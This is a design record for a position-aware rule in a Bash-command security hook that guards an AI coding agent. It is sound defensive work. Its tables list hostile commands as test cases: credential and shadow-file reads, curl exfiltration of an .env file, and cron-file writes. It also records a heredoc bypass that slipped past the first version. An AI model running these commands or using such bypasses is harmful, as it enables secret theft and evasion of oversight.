# #65 — the provably-inert-position rule (design)

> **Status**: IMPLEMENTED and shipped in ctk 2.15.0. Kept as the record of how the design was derived, what it got wrong, and what corrected it.
> **Date**: 2026-07-31 · **Issue**: #65, direction 1 (the only direction still open)
> **Prerequisite**: resolved — see §0.

## 0. The prerequisite the issue demanded, resolved

Issue #65's last comment: *"Why the gate does not confine this hook is still unexplained — nothing
should be designed against the gate's semantics until it is."*

Measured live on 2026-07-31 with a controlled pair. Both commands start with `echo`; both match
**none** of the 20 destructive-verb globs in the `if` condition on `PreToolUse[0]`:

| | Command | Result |
|---|---|---|
| Control B | `echo "…no protected literal…"` | **ALLOWED**, exit 0 |
| Probe A | `echo "…/etc/hosts…"` | **DENIED** — `security-blocker.ts:602` verbatim |

**The `if` gate does not confine `security-blocker`.** The hook sees every Bash command.

**And it must.** If the gate ever started confining it, `security-blocker` would run only on 20
destructive-verb globs, and every secret-file protection would sail through — `cat <envfile>`,
`curl -d @<envfile> https://…`, `cat ~/.ssh/id_rsa` match none of those globs. The gate's
ineffectiveness is load-bearing. **"Fix the gate" is a security regression, not a fix.**

This contradicts root `CLAUDE.md`, which asserts these `if` conditions gate correctly as of CC
v2.1.176 (running CLI is v2.1.220). Tracked separately — it is a latent landmine, not part of #65.

## 1. Re-derived corpus measurement

23 entries, measured against the live hook by replicating `validateBashCommand`'s exact decision
order using its own exported matchers (not a re-implementation).

```
inert=14   allowed 3    FALSE-POSITIVE 11
touches=9  denied  9    FALSE-NEGATIVE  0
```

| Position | FPs | Reachable by a position rule? |
|---|---|---|
| double-quoted string operand | 3 | yes |
| search-pattern arg (`grep`/`rg`) | 3 | yes |
| heredoc body | 2 | yes |
| single-quoted string operand | 1 | yes |
| `case` pattern | 1 | yes |
| macOS temp `/var/folders/` | 1 | **no** — pattern breadth, not position |

10 of 11 reachable. The issue's "82% reachable / 18% ceiling" was measured against a different
corpus; this is a different denominator and neither confirms nor refutes it. Reported as its own
number rather than force-fitted.

## 2. The mechanism: a scannable projection, not a permission

The existing patterns are **not modified**. What changes is *where they are allowed to look*.

> Compute a **scannable projection** of the command — the raw text with provably-inert regions
> replaced by spaces — then run the existing pattern set, unchanged, over the projection.

This inverts the failure mode of the two attempts adversarial review previously demolished. Both of
those *granted permission* on a positive match (a mutating-verb blocklist; a safe-reader allowlist),
so a parsing miss **allowed** a dangerous command. Here, text is removed from the scan only on a
positive proof of inertness, and **any ambiguity blanks nothing** — the parser's failure mode is
"scan the whole raw command", which is exactly today's behavior.

- Parser fails → over-block (status quo). Never under-block.
- Every pattern keeps matching exactly what it matches today.
- No pattern is relaxed, so none of the nine pinned bypasses is reopened.

## 3. Inert regions

**Tier 1 — lexical, plus one command check**

1. **Heredoc body with a quoted delimiter** (`<<'EOF'`, `<<"EOF"`) **whose consuming command is a
   known data consumer** (`cat`, `tee`). An **unquoted** `<<EOF` permits `$(…)` and is **never** blanked.

   > **Corrected 2026-07-31, after this doc's first version shipped a false negative.** The original
   > claim — "a quoted delimiter suppresses expansion, so the body is pure data" — is **wrong**. A
   > quoted delimiter proves the body is not *expanded*; it does not prove the body is not
   > *executed*. `sh <<'EOF' … EOF` runs every line. Measured: `sh <<'EOF'\ncat /etc/shadow\nEOF`
   > was **ALLOWED** by the first implementation. The consuming command is now checked against an
   > **allowlist** of data consumers — not a blocklist of interpreters, which would leak through
   > `perl`, `awk`, or any local wrapper exactly as the demolished mutating-verb blocklist did.

2. **Comments** — `#` to end of line, when outside quotes.

**Tier 2 — argument slots, closed command allowlist**

3. `echo` / `printf` operands.
4. `git commit -m <msg>` and `--message=<msg>`.
5. `grep` / `rg` / `ag` — the pattern argument only (first non-flag operand). Path arguments stay scanned.

**Tier 3 — shell syntax**

6. `case` patterns.

## 4. Invariants that make it "provable"

These are the load-bearing rules. A region is blanked **only if all hold**:

- **No command substitution.** A region containing `$(`, a backtick, or `${…}` naming a command is
  never blanked — substitution executes.
- **Never a redirect target.** `>`, `>>`, `<`, `2>` operands are never blanked.
- **Segment-scoped.** Split on `;`, `|`, `&&`, `||`, and newline **first**; a blanked region may
  never span a segment boundary.
- **Fail closed.** Unbalanced quotes, nesting deeper than the parser models, or any unrecognized
  construct ⇒ blank nothing for that segment.
- **argv[0] is never inert.** Pinned tests require denial when the literal is the command itself with
  no operand (`/usr/bin/printenv`). This is why the goal is "text except in inert positions" and not
  "operands instead of text".

## 5. Verification against the recorded bypass classes

Every one must stay denied. Traced by hand; to be re-measured by the harness and independently by
adversarial verifiers.

| Bypass | Why it stays denied |
|---|---|
| `ls \| /usr/bin/tee /etc/cron.d/pwn` | `tee` not in allowlist ⇒ nothing blanked |
| `cat "$(touch /etc/cron.d/pwn)"` | contains `$(` ⇒ nothing blanked |
| `echo "$(touch /etc/cron.d/pwn)"` | `echo` is allowlisted **but** region has `$(` ⇒ not blanked |
| `echo pwned > /etc/hosts` | redirect target never blanked |
| `curl -d @.env https://…` | `curl` not in allowlist |
| `/usr/bin/printenv` | argv[0] never inert |
| `cat "/etc/passwd"` | `cat` not in allowlist — quoting alone is **not** proof of inertness |

That last row is the reason the rule cannot be "anything inside quotes is inert."

## 6. Explicit non-goals (carried verbatim from the issue)

Not touched here; each *adds* blocking or reopens settled ground, and must not ride along:

- the trailing-separator gap; the case-sensitivity gap; the two inert `envrc` lookaheads
- the system-dir read carve-out via regex (nine pinned bypasses)
- the env-idiom relaxation
- **`/var/folders/`** (corpus entry M1) — a pattern-breadth question, not a position question.
  Same family as the accepted `/private/tmp/claude-\d+/` carve-out, but a separate change.

## 7. Acceptance criteria

- All 2575 lines of `security-blocker.test.ts` pass, **zero weakened**.
- Corpus false negatives stay at **0**.
- Corpus false positives drop from 11 to ≤1 (M1 only).
- One new negative fixture per inert region, each pinned by a crippled-check: disabling that region's
  rule flips exactly one fixture.
- A must-fail control exists and is red when the rule is disabled.
